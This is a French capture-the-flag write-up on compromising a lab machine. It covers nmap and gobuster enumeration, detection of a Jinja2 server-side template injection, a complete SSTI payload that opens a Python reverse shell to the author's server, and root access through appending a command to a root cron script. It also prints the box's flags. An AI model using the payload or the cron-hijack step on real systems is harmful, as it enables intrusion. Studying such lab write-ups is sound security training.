# Unknow Box
## <b>Phase d'énumération :</b>

IP : <b> 167.99.244.212</b> (change à chaque reboot)


N'ayant qu'une IP et sachant evidemment au préalable qu'il n'y a pas de blueteam en face, mon premier reflexe est un scan nmap.


<b>Commande :</b> sudo nmap -A \<ip de la machine\>

<b>Output :</b> 
```
PORT     STATE    SERVICE    VERSION
21/tcp   open     tcpwrapped
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:04:b8:8b:b6:8b:2b:10:41:16:0a:ab:18:84:67:68 (RSA)
|   256 9e:54:01:dc:8b:41:bb:9a:3e:6e:c1:3d:b2:ae:f7:71 (ECDSA)
|_  256 e8:50:86:5c:8b:ee:13:11:7e:e2:55:3d:7d:8a:ea:f1 (ED25519)
80/tcp   open     http       Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-server-header: Werkzeug/1.0.1 Python/2.7.17
|_http-title: OhNoMySite!
82/tcp   open     tcpwrapped
84/tcp   open     tcpwrapped
443/tcp  open     tcpwrapped
514/tcp  filtered shell
554/tcp  open     rtsp?
1723/tcp open     tcpwrapped
|_pptp-version: ERROR: Script execution failed (use -d to debug)
1971/tcp open     tcpwrapped
5060/tcp open     sip?
9999/tcp open     http       Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```
Très bien, ça nous fait de la matière à tester.

Allons voir le site web sur le port 80. Je lance en parallèle un GOBUSTER.
<b>Commande :</b> 

```gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt dir --url \<IP>```
<b>Output :</b>

```/dev (status : 200)```
Dans ce directory, la page nous dit de lui donner un paramètre URL, essayons.
<b>URL :</b> http://ip/dev?url=test
<b>Output :</b> ```
Checking url : test!
Service is not working yet ....```

Tiens, on passe un argument dans l'url et ce même arg est print sur la page, il y a peut être une injection à tester, non ?

Testons celui ci : <b>?url={{7*7}}</b>, qui permet de tester la présence d'une SSTI (Server Side Template Injection) sur certains moteur.

Bingo, l'output est 49 ! Il y a donc bien une vulnérabilité.

Testons désormais : ?url={{7*'7'}}. L'ouput est alors : 7777777, ce qui nous indique que le moteur utilisé est jinja2 et qu'il est vulnérable.
(cf https://portswigger.net/web-security/server-side-template-injection).

Très bien, tentons d'obtenir un reverse shell avec notre petite SSTI, pour cela, allons voir ce que nous propose payloadAllTheThings.
Ne voulant pas ouvrir les ports de ma box, j'ai utilisé mon VPS pour recevoir le shell, mais d'autres manières était possibles, bien que moins pratiques selon moi.

<b>Payload utilisé :</b>

<b>```{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\"/bin/sh\");'").read().zfill(417)}}{%endif%}{% endfor %}```</b>

Désormais, on a notre shell sur le port indiqué :p. Naviguons jusqu'au /home de l'user que nous avons, cad OhNoMySite et on peut cat le user !
User : BC{e92d763a1c3689605785c94189db8eba}

## <b>Privilege Escalation :</b>

Sur ma liste imaginaire des choses à toujours vérifier, il y a crontab.
<b>Commande :</b> ```Cat /etc/crontab```

<b>Output (pertinent) :</b> 
```* * * * *       root    /opt/cleaning/clean.sh```

Les étoiles nous indiquent que ce script est toujours actif et nous savons aussi qu'il tourne sur l'utilisateur root.
On ne va pas s'embêter, pour avoir le root.txt, on va tout simplement tenter de le copier dans notre /home :).

<b>Payload :</b>  ```echo "cp /root/root.txt /home/OhNoMySite/root.txt" >>  /opt/cleaning/clean.sh```

Et le tour est joué, il n'y a plus qu'à cat root.txt.
(Bien entendu, dans le cadre d'une post-exploitation, cette façon de faire n'est pas très pratique, l'ideal serait de se renvoyer un shell via crontab ou de récupérer les accès ssh de l'user root si il y en a).

ROOT  : BC{15caf8a4b9d3cb5453dfa11810f0233a}
